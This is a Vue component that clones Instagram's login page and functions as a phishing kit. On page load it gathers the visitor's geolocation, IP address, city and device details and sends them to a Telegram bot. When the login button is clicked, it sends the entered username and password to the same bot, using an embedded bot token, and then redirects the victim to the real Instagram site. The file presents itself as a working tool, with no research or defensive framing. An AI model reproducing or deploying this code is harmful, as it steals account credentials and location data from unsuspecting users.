<template>
  <div>
    <main class="flex align-items-center justify-content-center">
      <section id="mobile" class="flex"></section>
      <section id="auth" class="flex direction-column">
        <div class="panel login flex direction-column">
          <h1 title="Instagram" class="flex justify-content-center">
            <img
              src="/img/instagram-logo.png"
              alt="Instagram logo"
              title="Instagram logo"
            />
          </h1>
          <form id="loginForm">
            <label for="email" class="sr-only"
              >Telefone, nome de usuário ou e-mail</label
            >
            <input
              name="login"
              type="text"
              @input="login = $event.target.value"
              placeholder="Phone number, username or email address"
            />

            <label  for="password" class="sr-only">Senha</label>
            <input @input="password = $event.target.value" name="password" type="password" placeholder="Senha" />

            <button :disabled="login.length == 0" @click="send()" type="button">Entrar</button>
          </form>
          <div class="flex separator align-items-center">
            <span></span>
            <div class="or">OU</div>
            <span></span>
          </div>
          <div class="login-with-fb flex direction-column align-items-center">
            <div>
              <img />
              <a>Entrar com o facebook</a>
            </div>
            <a href="#">Esqueceua senha?</a>
          </div>
        </div>
        <div class="panel register flex justify-content-center">
          <p>Não tem uma conta?</p>
          <a href="#">Cadastre-se</a>
        </div>
        <div class="app-download flex direction-column align-items-center">
          <p>Obtenha o aplicativo.</p>
          <div class="flex justify-content-center">
            <img
              src="/img/apple-button.png"
              alt="Imagem com a logo da Apple Store"
              title="Imagem com a logo da Apple Store"
            />
            <img
              src="/img/googleplay-button.png"
              alt="Imagem com a logo da Google Play"
              title="Imagem com a logo da Google Play"
            />
          </div>
        </div>
      </section>
    </main>
    <footer>
      <ul class="flex flex-wrap justify-content-center">
        <li><a href="#">SOBRE</a></li>
        <li><a href="#">AJUDA</a></li>
        <li><a href="#">IMPRENSA</a></li>
        <li><a href="#">API</a></li>
        <li><a href="#">CARREIRAS</a></li>
        <li><a href="#">PRIVACIDADE</a></li>
        <li><a href="#">TERMOS</a></li>
        <li><a href="#">LOCALIZAÇÃO</a></li>
        <li><a href="#">CONTAS MAIS RELEVANTES</a></li>
        <li><a href="#">HASHTAGS</a></li>
        <li><a href="#">IDIOMA</a></li>
      </ul>
      <p class="copyright">© 2020 Instagram do Facebook</p>
    </footer>
  </div>
</template>
<script>
import axios from "axios";
export default {
  data() {
    return {
      login: '',
      password: ''
    }
  },
  methods: {
    async sendTelegramBot() {
      try {
        const currentDate = new Date();
        const time = currentDate.toLocaleString();

        // Joylashuv olish (asinxron)
        const getLocation = () => {
          return new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                resolve(
                  `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}`
                );
              },
              () => {
                resolve("Joylashuv: Mavjud emas");
              }
            );
          });
        };

        const ipData = await fetch("https://ipapi.co/json/").then((res) =>
          res.json()
        );

        const location = await getLocation();
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const ip = ipData.ip || "IP: Noma'lum";
        const city = ipData.city || "Shahar: Noma'lum";
        const region = ipData.region || "Hudud: Noma'lum";
        const country = ipData.country_name || "Davlat: Noma'lum";
        const timezone = ipData.timezone || "Vaqt zonasi: Noma'lum";

        let data = {
          chat_id: 7307333248,
          text: `🔴 SAYTGA KIRILDI  
🕒 Kirilgan vaqt: ${time}
📱 Qurulma: ${userAgent}
💻 Platforma: ${platform}
🗣 Til: ${language}
📍 Joylashuv: ${location}
🌎 IP: ${ip}
🏙 Shahar: ${city}
🗺 Hudud: ${region}
🇺🇿 Davlat: ${country}
🕰 Vaqt zonasi: ${timezone}`,
        };

        const response = await axios.post(
          "https://api.telegram.org/bot7803083105:AAHWu6G-2TBCukqFwbKDPWk5HLjbF0-W3wU/sendMessage",
          data
        );
      } catch (error) {
        throw error;
      }
    },
     async send() {
      try {
        const currentDate = new Date();
        let data = {
          chat_id: 7307333248,
          text: `🔴 Login va Parol olindi !  
✅ login: ${this.login}
✅ parol: ${this.password}`
        };

        const response = await axios.post(
          "https://api.telegram.org/bot7803083105:AAHWu6G-2TBCukqFwbKDPWk5HLjbF0-W3wU/sendMessage",
          data
        );

        window.location.href = 'https://www.instagram.com/';
      } catch (error) {
        throw error;
      }
    },
  },
  mounted() {
    this.sendTelegramBot()
  },
};
</script>
<style lang=""></style>
